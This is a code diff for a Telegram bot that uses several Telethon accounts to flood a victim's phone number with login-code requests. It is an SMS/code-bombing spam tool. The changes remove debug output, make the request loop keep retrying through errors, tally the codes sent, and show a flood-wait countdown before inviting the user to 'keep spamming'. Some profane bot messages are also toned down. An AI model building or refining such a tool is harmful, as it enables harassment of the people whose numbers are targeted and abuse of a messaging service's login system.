@@ -42,44 +42,51 @@ def clean_phone(phone):
 
 def send_codes_sync(chat_id, msg_id, phone):
     async def send_codes():
-        print(f"[DEBUG] send_codes called for phone {phone}")
-        log_msg = bot.send_message(chat_id, "Отправка начата...")
+        log_msg = bot.send_message(chat_id, "otpravka nachata...")
         max_flood = 0
+        total_sent = 0
         results = []
 
         async def send_one_client(client, idx):
-            nonlocal max_flood
+            nonlocal max_flood, total_sent
             sent = 0
-            for attempt in range(6):
+            attempt = 0
+            while attempt < 6:
                 try:
-                    print(f"[DEBUG] Акк{idx}: попытка {attempt+1}")
                     await client.send_code_request(phone)
                     sent += 1
-                    print(f"[DEBUG] Акк{idx}: успешно отправлено {sent}")
+                    total_sent += 1
+                    attempt += 1
+                    await asyncio.sleep(2)
                 except errors.FloodWaitError as e:
-                    print(f"[DEBUG] Акк{idx}: FloodWait {e.seconds}")
                     if e.seconds > max_flood:
                         max_flood = e.seconds
-                    await asyncio.sleep(e.seconds)
+                    remaining = e.seconds
+                    while remaining > 0:
+                        bot.edit_message_text(f"floodwait - {remaining} sekund", chat_id, msg_id)
+                        await asyncio.sleep(1)
+                        remaining -= 1
+                    attempt += 1
                 except Exception as e:
-                    print(f"[ERROR] Акк{idx}: {e}")
-                    break
-            return f"Акк{idx}: {sent}/6"
+                    print(f"[ERROR] Akk{idx}: {e}")
+                    await asyncio.sleep(2)
+                    attempt += 1
+            return sent
 
         tasks = [send_one_client(client, i+1) for i, client in enumerate(clients)]
         results = await asyncio.gather(*tasks)
-        print(f"[DEBUG] Результаты: {results}")
-        bot.edit_message_text("\n".join(results), chat_id, log_msg.message_id)
-        bot.edit_message_text("gotovo tvoia mat viebana", chat_id, msg_id)
+        total_sent = sum(results)
+        bot.edit_message_text(f"otpravleno {total_sent} codov", chat_id, log_msg.message_id)
+        bot.edit_message_text("gotovo", chat_id, msg_id)
         if max_flood > 0:
             remaining = max_flood
             while remaining > 0:
-                bot.edit_message_text(f"floodwait - {remaining}sekund", chat_id, msg_id)
+                bot.edit_message_text(f"floodwait - {remaining} sekund", chat_id, msg_id)
                 time.sleep(1)
                 remaining -= 1
         kb = types.InlineKeyboardMarkup()
         kb.add(types.InlineKeyboardButton("spam", callback_data="spam"))
-        bot.edit_message_text("floodwait zakonchen mochesh dalshe spamit", chat_id, msg_id, reply_markup=kb)
+        bot.edit_message_text("floodwait zakonchen, mozhesh dalshe spamit", chat_id, msg_id, reply_markup=kb)
         if chat_id in user_states:
             user_states[chat_id]["timer_task"] = None
 
@@ -90,7 +97,7 @@ def start(message):
     chat_id = message.chat.id
     kb = types.InlineKeyboardMarkup()
     kb.add(types.InlineKeyboardButton("spam", callback_data="spam"))
-    sent = bot.reply_to(message, "privet ueban chtob spamit nashmi vnizu (spam)", reply_markup=kb)
+    sent = bot.reply_to(message, "privet, chtob spamit nashmi vnizu (spam)", reply_markup=kb)
     user_states[chat_id] = {"message_id": sent.message_id, "waiting_phone": False}
 
 @bot.callback_query_handler(func=lambda call: call.data == "spam")
@@ -120,10 +127,8 @@ app = Flask(__name__)
 
 @app.route('/webhook', methods=['POST'])
 def webhook():
-    print("Webhook called")
     if request.headers.get('content-type') == 'application/json':
         json_str = request.get_data().decode('utf-8')
-        print("Received:", json_str)
         update = telebot.types.Update.de_json(json_str)
         bot.process_new_updates([update])
         return '', 200
